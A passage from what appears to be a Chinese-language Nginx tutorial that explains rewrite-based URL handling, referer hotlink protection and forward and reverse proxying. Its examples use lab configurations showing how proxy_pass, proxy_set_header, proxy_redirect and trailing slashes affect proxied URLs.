localhost;<br><span class="hljs-section">location</span> /server&#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/server-([0-9]+)-([0-9]+)-([0-9]+)-([0-9]+)\.html$</span> /server/<span class="hljs-variable">$1</span>/<span class="hljs-variable">$2</span>/<span class="hljs-variable">$3</span>/<span class="hljs-variable">$4</span>/<span class="hljs-variable">$5</span>.html <span class="hljs-literal">last</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样的花，客户端只需要输入http://www.web.name/server-11-22-33-44-20.html就可以访问到20.html页面了。这里也充分利用了rewrite指令支持正则表达式的特性。</p><h4 id="防盗链"><a class="markdownIt-Anchor" href="#防盗链"></a> 防盗链</h4><p>防盗链之前我们已经介绍过了相关的知识，在rewrite中的防盗链和之前将的原理其实都是一样的，只不过通过rewrite可以将防盗链的功能进行完善下，当出现防盗链的情况，我们可以使用rewrite将请求转发到自定义的一张图片和页面，给用户比较好的提示信息。下面我们就通过根据文件类型实现防盗链的一个配置实例:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /images &#123;<br>    <span class="hljs-attribute">root</span> html;<br>    <span class="hljs-attribute">valid_referers</span> <span class="hljs-literal">none</span> <span class="hljs-literal">blocked</span> www.baidu.com;<br>    <span class="hljs-attribute">if</span> (<span class="hljs-variable">$invalid_referer</span>)&#123;<br>        <span class="hljs-comment">#return 403;</span><br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/</span>    /images/forbidden.png <span class="hljs-literal">break</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="nginx反向代理"><a class="markdownIt-Anchor" href="#nginx反向代理"></a> Nginx反向代理</h1><h2 id="nginx反向代理概述"><a class="markdownIt-Anchor" href="#nginx反向代理概述"></a> Nginx反向代理概述</h2><p>关于正向代理和反向代理，我们在前面的章节已经通过一张图给大家详细的介绍过了，简而言之就是正向代理代理的对象是客户端，反向代理代理的是服务端，这是两者之间最大的区别。</p><p>Nginx即可以实现正向代理，也可以实现反向代理。</p><p>我们先来通过一个小案例演示下Nginx正向代理的简单应用。</p><p>先提需求：</p><p><img src="F:%5C%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%5CNginx%E7%AC%94%E8%AE%B0%5Cassets%5C1581846370052.png" alt="" /></p><p>(1)服务端的设置：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http &#123;<br>  log_format main <span class="hljs-string">&#x27;client send request=&gt;clientIp=$remote_addr serverIp=&gt;$host&#x27;</span>;<br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_namelocalhost;<br>access_log logs/<span class="hljs-keyword">access</span>.<span class="hljs-keyword">log</span> main;<br><span class="hljs-keyword">location</span> &#123;<br>root html;<br><span class="hljs-keyword">index</span> <span class="hljs-keyword">index</span>.html <span class="hljs-keyword">index</span>.htm;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2)使用客户端访问服务端，打开日志查看结果</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1589729000713.png" alt="1589729000713" /></p><p>(3)代理服务器设置：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><br>        <span class="hljs-attribute">listen</span>  <span class="hljs-number">82</span>;<br>        <span class="hljs-attribute">resolver</span> <span class="hljs-number">8.8.8.8</span>;<br>        <span class="hljs-section">location</span> /&#123;<br>                <span class="hljs-attribute">proxy_pass</span> http://<span class="hljs-variable">$host</span><span class="hljs-variable">$request_uri</span>;<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>(4)查看代理服务器的IP(192.168.23.132)和Nginx配置监听的端口(82)</p><p>(5)在客户端配置代理服务器</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581847577947.png" alt="" /></p><p>(6)设置完成后，再次通过浏览器访问服务端</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1589729479920.png" alt="1589729479920" /></p><p>通过对比，上下两次的日志记录，会发现虽然我们是客户端访问服务端，但是如何使用了代理，那么服务端能看到的只是代理发送过去的请求，这样的化，就使用Nginx实现了正向代理的设置。</p><p>但是Nginx正向代理，在实际的应用中不是特别多，所以我们简单了解下，接下来我们继续学习Nginx的反向代理，这是Nginx比较重要的一个功能。</p><h2 id="nginx反向代理的配置语法"><a class="markdownIt-Anchor" href="#nginx反向代理的配置语法"></a> Nginx反向代理的配置语法</h2><p>Nginx反向代理模块的指令是由<code>ngx_http_proxy_module</code>模块进行解析，该模块在安装Nginx的时候已经自己加装到Nginx中了，接下来我们把反向代理中的常用指令一一介绍下：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">proxy<span class="hljs-emphasis">_pass</span><br><span class="hljs-emphasis">proxy_set_header</span><br><span class="hljs-emphasis">proxy_</span>redirect<br></code></pre></td></tr></table></figure><h3 id="proxy_pass"><a class="markdownIt-Anchor" href="#proxy_pass"></a> proxy_pass</h3><p>该指令用来设置被代理服务器地址，可以是主机名称、IP地址加端口号形式。</p><table><thead><tr><th>语法</th><th>proxy_pass URL;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>location</td></tr></tbody></table><p>URL:为要设置的被代理服务器地址，包含传输协议(<code>http</code>,<code>https://</code>)、主机名称或IP地址加端口号、URI等要素。</p><p>举例：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">proxy_pass http:<span class="hljs-regexp">//</span>www.baidu.com;<br>location /server&#123;&#125;<br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>;<br>    http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span><span class="hljs-regexp">/server/i</span>ndex.html<br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>/;<br>    http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>/index.html<br></code></pre></td></tr></table></figure><p>大家在编写proxy_pass的时候，后面的值要不要加&quot;/&quot;?</p><p>接下来通过例子来说明刚才我们提到的问题：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk">server &#123;<br>listen <span class="hljs-number">80</span>;<br>server_name localhost;<br>location /&#123;<br><span class="hljs-comment">#proxy_pass http://192.168.23.132;</span><br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>/;<br>&#125;<br>&#125;<br>当客户端访问 http:<span class="hljs-regexp">//</span>localhost/index.html,效果是一样的<br>server&#123;<br>listen <span class="hljs-number">80</span>;<br>server_name localhost;<br>location /server&#123;<br><span class="hljs-comment">#proxy_pass http://192.168.23.132;</span><br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>/;<br>&#125;<br>&#125;<br>当客户端访问 http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/server/i</span>ndex.html<br>这个时候，第一个proxy_pass就变成了http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/server/i</span>ndex.html<br>第二个proxy_pass就变成了http:<span class="hljs-regexp">//</span>localhost/index.html效果就不一样了。<br></code></pre></td></tr></table></figure><h3 id="proxy_set_header"><a class="markdownIt-Anchor" href="#proxy_set_header"></a> proxy_set_header</h3><p>该指令可以更改Nginx服务器接收到的客户端请求的请求头信息，然后将新的请求头发送给代理的服务器</p><table><thead><tr><th>语法</th><th>proxy_set_header field value;</th></tr></thead><tbody><tr><td>默认值</td><td>proxy_set_header Host $proxy_host;<br/>proxy_set_header Connection close;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>需要注意的是，如果想要看到结果，必须在被代理的服务器上来获取添加的头信息。</p><p>被代理服务器： [192.168.23.132]</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span>  <span class="hljs-number">8080</span>;<br>        <span class="hljs-attribute">server_name</span> localhost;<br>        <span class="hljs-attribute">default_type</span> text/plain;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-variable">$http_username</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>代理服务器: [192.168.200.133]</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span>  <span class="hljs-number">8080</span>;<br>        <span class="hljs-attribute">server_name</span> localhost;<br>        <span class="hljs-section">location</span> /server &#123;<br>                <span class="hljs-attribute">proxy_pass</span> http://192.168.23.132:8080/;<br>                <span class="hljs-attribute">proxy_set_header</span> username TOM;<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>访问测试</p><h3 id="proxy_redirect"><a class="markdownIt-Anchor" href="#proxy_redirect"></a> proxy_redirect</h3><p>该指令是用来重置头信息中的&quot;Location&quot;和&quot;Refresh&quot;的值。</p><table><thead><tr><th>语法</th><th>proxy_redirect redirect replacement;<br/>proxy_redirect default;<br/>proxy_redirect off;</th></tr></thead><tbody><tr><td>默认值</td><td>proxy_redirect default;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><blockquote><p>为什么要用该指令?</p></blockquote><p>服务端[192.168.23.132]</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>  <span class="hljs-number">8081</span>;<br>    <span class="hljs-attribute">server_name</span> localhost;<br>    <span class="hljs-attribute">if</span> (!-f <span class="hljs-variable">$request_filename</span>)&#123;<br>    <span class="hljs-attribute">return</span> <span class="hljs-number">302</span> http://192.168.23.132;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>代理服务端[192.168.200.133]</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span>  <span class="hljs-number">8081</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> / &#123;<br><span class="hljs-attribute">proxy_pass</span> http://192.168.23.132:8081/;<br><span class="hljs-attribute">proxy_redirect</span> http://192.168.23.132 http://192.168.200.133;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>该指令的几组选项</p></blockquote><p>proxy_redirect redirect replacement;</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">redirect:</span>目标,Location的值<br><span class="hljs-symbol">replacement:</span>要替换的值<br></code></pre></td></tr></table></figure><p>proxy_redirect default;</p><figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs glsl"><span class="hljs-keyword">default</span>;<br>将<span class="hljs-keyword">location</span>块的uri变量作为replacement,<br>将proxy_pass变量作为redirect进行替换<br></code></pre></td></tr></table></figure><p>proxy_redirect off;</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">关闭proxy_redirect的功能<br></code></pre></td></tr></table></figure><h2 id="nginx反向代理实战"><a class="markdownIt-Anchor" href="#nginx反向代理实战"></a> Nginx反向代理实战</h2><h3 id="nginx反向代理实战一"><a class="markdownIt-Anchor" href="#nginx反向代理实战一"></a> Nginx反向代理实战一</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118140544272.png" alt="image-20230118140544272" /></p><p>服务器1,2,3存在两种情况</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">第一种情况: 三台服务器的内容不一样。</span><br><span class="hljs-section">第二种情况: 三台服务器的内容是一样。</span><br></code></pre></td></tr></table></figure><ol><li>如果服务器1、服务器2和服务器3的内容不一样，那我们可以根据用户请求来分发到不同的服务器。</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">代理服务器<br><span class="hljs-keyword">server</span> &#123;<br>        <span class="hljs-keyword">listen</span>          <span class="hljs-number">8082</span>;<br>        server_name     localhost;<br>        <span class="hljs-keyword">location</span> /server1 &#123;<br>                proxy_pass http://<span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9001</span>/;<br>        &#125;<br>        <span class="hljs-keyword">location</span> /server2 &#123;<br>                proxy_pass http://<span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9002</span>/;<br>        &#125;<br>        <span class="hljs-keyword">location</span> /server3 &#123;<br>                proxy_pass http://<span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9003</span>/;<br>        &#125;<br>&#125;<br><br>服务端<br>server1<br><span class="hljs-keyword">server</span> &#123;<br>        <span class="hljs-keyword">listen</span>          <span class="hljs-number">9001</span>;<br>        server_name     localhost;<br>        default_type <span class="hljs-type">text</span>/html;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;192.168.23.132:9001&lt;/h1&gt;&#x27;</span><br>&#125;<br>server2<br><span class="hljs-keyword">server</span> &#123;<br>        <span class="hljs-keyword">listen</span>          <span class="hljs-number">9002</span>;<br>        server_name     localhost;<br>        default_type <span class="hljs-type">text</span>/html;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;192.168.23.132:9002&lt;/h1&gt;&#x27;</span><br>&#125;<br>server3<br><span class="hljs-keyword">server</span> &#123;<br>        <span class="hljs-keyword">listen</span>          <span class="hljs-number">9003</span>;<br>        server_name     localhost;<br>        default_type <span class="hljs-type">text</span>/html;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;192.168.23.132:9003&lt;/h1&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>如果服务器1、服务器2和服务器3的内容是一样的，该如何处理?</li></ol><h3 id="nginx反向代理实战二"><a class="markdownIt-Anchor" href="#nginx反向代理实战二"></a> Nginx反向代理实战二</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118180222440.png" alt="image-20230118180222440" /></p><ol><li><p>服务器是pc本机开启的一个springboot项目</p></li><li><p>代理服务器</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#39010    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39010</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win &#123;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#39011    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39011</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win/ &#123; <span class="hljs-comment"># 结尾有/ 会自动重定向</span><br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#39012    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39012</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win &#123;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80/;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#39013    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39013</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win/ &#123;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80/;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#以为代理之后的rul分别为 </span><br><span class="hljs-comment">#/win</span><br><span class="hljs-comment">#/win/</span><br><span class="hljs-comment">#/</span><br><span class="hljs-comment">#/</span><br></code></pre></td></tr></table></figure><p>访问路径为 <strong>linux.nginx:3901X/win</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118183908211.png" alt="image-20230118183908211" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184035753.png" alt="image-20230118184035753" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184104866.png" alt="image-20230118184104866" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184132855.png" alt="image-20230118184132855" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118185716758.png" alt="" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184205181.png" alt="image-20230118184205181" /></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#39020    </span><br>       <span class="hljs-section">server</span> &#123;<br>           <span class="hljs-attribute">listen</span> <span class="hljs-number">39020</span>;<br>           <span class="hljs-attribute">server_name</span>  linux.nginx;<br>           <br>           <span class="hljs-section">location</span>  /win &#123;<br>           <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>               <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80;<br>           &#125;  <br>       &#125;<br>   <span class="hljs-comment">#39021    </span><br>       <span class="hljs-section">server</span> &#123;<br>           <span class="hljs-attribute">listen</span> <span class="hljs-number">39021</span>;<br>           <span class="hljs-attribute">server_name</span>  linux.nginx;<br>           <br>           <span class="hljs-section">location</span>  /win/ &#123;<br>           <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>               <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80;<br>           &#125;  <br>       &#125;<br>   <span class="hljs-comment">#39022    </span><br>       <span class="hljs-section">server</span> &#123;<br>           <span class="hljs-attribute">listen</span> <span class="hljs-number">39022</span>;<br>           <span class="hljs-attribute">server_name</span>  linux.nginx;<br>           <br>           <span class="hljs-section">location</span>  /win &#123;<br>           <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>               <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80/;<br>           &#125;  <br>       &#125;<br>   <span class="hljs-comment">#39023    </span><br>       <span class="hljs-section">server</span> &#123;<br>           <span class="hljs-attribute">listen</span> <span class="hljs-number">39023</span>;<br>           <span class="hljs-attribute">server_name</span>  linux.nginx;<br>           <br>           <span class="hljs-section">location</span>  /win/ &#123;<br>           <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>               <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80/;<br>           &#125;  <br>       &#125;<br>   <span class="hljs-comment">#以为代理之后的rul分别为 </span><br>   <span class="hljs-comment">#/win</span><br>   <span class="hljs-comment">#/</span><br>   <span class="hljs-comment">#/</span><br>   <span class="hljs-comment">#/</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184644140.png" alt="image-20230118184644140" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184706432.png" alt="image-20230118184706432" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184725991.png" alt="image-20230118184725991" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184746175.png" alt="image-20230118184746175" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118184832678.png" alt="image-20230118184832678" /></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#39030    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39030</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win &#123;<br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#39031    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39031</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win/ &#123;<br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#39032    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39032</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win &#123;<br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80/;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#39033    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39033</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win/ &#123;<br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80/;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#以为代理之后的rul分别为 </span><br><span class="hljs-comment">#/win</span><br><span class="hljs-comment">#/</span><br><span class="hljs-comment">#/</span><br><span class="hljs-comment">#/</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118185134045.png" alt="image-20230118185134045" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118185155031.png" alt="image-20230118185155031" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118185238480.png" 